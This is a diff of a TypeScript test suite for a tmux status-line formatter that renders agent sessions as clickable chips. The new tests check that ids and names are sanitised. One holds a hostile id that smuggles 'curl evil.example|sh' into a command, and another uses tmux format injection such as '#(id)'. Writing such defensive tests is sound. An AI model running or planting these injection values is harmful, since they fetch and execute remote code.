@@ -13,9 +13,9 @@ const plain = (s: string) => s.replace(FILTER_RE, "").replace(/#\[[^\]]*\]/g, ""
 const chips = (s: string) => s.replace(FILTER_RE, "");
 
 test("a chip is a status-coloured ▌ bar on the surface0 highlight, wrapped in its click range", () => {
-  const rows = [mkRow({ session_id: "agx-1", status: "running", tmux_session: "work", tmux_window: "2" })];
+  const rows = [mkRow({ session_id: "ab-1", status: "running", tmux_session: "work", tmux_window: "2" })];
   const out = formatStatusLine(rows, OPTS);
-  expect(out.startsWith("#[range=user|@agx-1]#[bg=#313244,fg=#b4befe]▌")).toBe(true);
+  expect(out.startsWith("#[range=user|@ab-1]#[bg=#313244,fg=#b4befe]▌")).toBe(true);
   expect(chips(out).endsWith(" #[default]#[norange]")).toBe(true);
   expect(plain(out)).toBe("▌⠋ work:2 ");
 });
@@ -71,9 +71,10 @@ test("the line always ends in a ▽ filter chip showing the mode's glyphs", () =
 });
 
 test("show modes: working = waiting+done+running, all adds idle", () => {
-  const rows = ["waiting", "done", "running", "idle"].map((status) => mkRow({ session_id: status, status: status as any }));
+  const ID: Record<string, string> = { aa: "waiting", bb: "done", cc: "running", dd: "idle" };
+  const rows = Object.entries(ID).map(([id, status]) => mkRow({ session_id: id, status: status as any }));
   const ids = (show: StatusLineOpts["show"]) =>
-    [...chips(formatStatusLine(rows, { ...OPTS, show })).matchAll(/range=user\|@(\w+)/g)].map((m) => m[1]);
+    [...chips(formatStatusLine(rows, { ...OPTS, show })).matchAll(/range=user\|@(\w+)/g)].map((m) => ID[m[1]!]);
   expect(ids("working")).toEqual(["waiting", "done", "running"]);
   expect(ids("all")).toEqual(["waiting", "done", "running", "idle"]);
   expect(ids("attention")).toEqual(["waiting", "done"]);
@@ -131,7 +132,7 @@ test("show=attention keeps waiting and done rows", () => {
 });
 
 test("overflow past max collapses to a faint +N chip", () => {
-  const rows = Array.from({ length: 5 }, (_, i) => mkRow({ session_id: `s${i}`, tmux_session: "w", tmux_window: String(i) }));
+  const rows = Array.from({ length: 5 }, (_, i) => mkRow({ session_id: `a${i}`, tmux_session: "w", tmux_window: String(i) }));
   expect(formatStatusLine(rows, { ...OPTS, max: 3 })).toContain("#[bg=#313244,fg=#6c7086] +2 #[default]");
 });
 
@@ -207,7 +208,7 @@ test("plain fields in a template are escaped too", () => {
 
 // Fit to width: names shrink first (to NAME_MIN), only then chips fold into +N.
 const named = (n: number, len = 20) =>
-  Array.from({ length: n }, (_, i) => mkRow({ session_id: `s${i}`, status: "running", name: `${"abcdefghijklmnopqrstuvwxyz".slice(0, len - 1)}${i}` }));
+  Array.from({ length: n }, (_, i) => mkRow({ session_id: `a${i}`, status: "running", name: `${"abcdefghijklmnopqrstuvwxyz".slice(0, len - 1)}${i}` }));
 const nameCaps = (s: string) => plain(s).split(" ").filter((w) => w.startsWith("▌")).map((w) => w.length - 1);
 const NAME_FMT = { ...OPTS, format: "{name}" };
 
@@ -283,4 +284,18 @@ test("a remote chip prefixes the name with ⇄, counted by the width fit; escapi
   const rows = [mkRow({ name: "x".repeat(24), remote: true })];
   const out = formatStatusLine(rows, { ...f, width: 14 });
   expect(statusWidth(chips(out))).toBeLessThanOrEqual(14);
+});
+
+test("chipToken keeps only hex digits and dashes of a hostile id; parseChipToken refuses others", () => {
+  const t = chipToken("x'; curl evil.example|sh #");
+  expect(t).toMatch(/^@[0-9a-f-]*$/);
+  expect(t).not.toContain("'");
+  expect(parseChipToken("@ab'; sh")).toBeNull();
+  expect(parseChipToken("@0198abcd-1234-")).toEqual({ kind: "session", prefix: "0198abcd-1234-" });
+});
+
+test("no tmux format survives in agent text: every # is doubled", () => {
+  const out = formatStatusLine([mkRow({ name: "a #{host} #(id) #x" })], { ...OPTS, format: "{name}" });
+  expect(out).toContain("a ##{host} ##(id) ##x");
+  expect(statusWidth("a ##{host}")).toBe(9);
 });
